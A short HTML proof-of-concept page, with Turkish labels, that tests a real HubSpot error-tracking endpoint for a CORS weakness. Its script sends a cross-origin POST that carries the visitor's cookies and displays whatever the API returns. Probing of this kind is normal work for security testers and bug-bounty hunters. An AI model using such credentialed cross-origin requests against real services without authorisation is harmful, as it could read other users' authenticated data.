<!DOCTYPE html>
<html>
<head>
    <title>CORS Test - HubSpot</title>
</head>
<body>
    <h1>HubSpot CORS Zafiyet Testi</h1>
    <div id="response"></div>

    <script>
        fetch("https://exceptions-eu1.hubspot.com/frontend/observability/page-tracking/store/?sentry_version=7&sentry_client=raven-js%2F3.19.1&deployable=setup-guide-ui", {
            method: 'POST',
            headers: {
                'Content-Type': 'text/plain',
                'Accept': 'application/json',
            },
            credentials: 'include'  // Çerezleri gönder (eğer API auth kullanıyorsa)
        })
        .then(response => response.text())
        .then(data => {
            document.getElementById("response").innerText = "API Yanıtı: " + data;
            console.log(data);
        })
        .catch(error => {
            document.getElementById("response").innerText = "Hata: " + error;
        });
    </script>
</body>
</html>
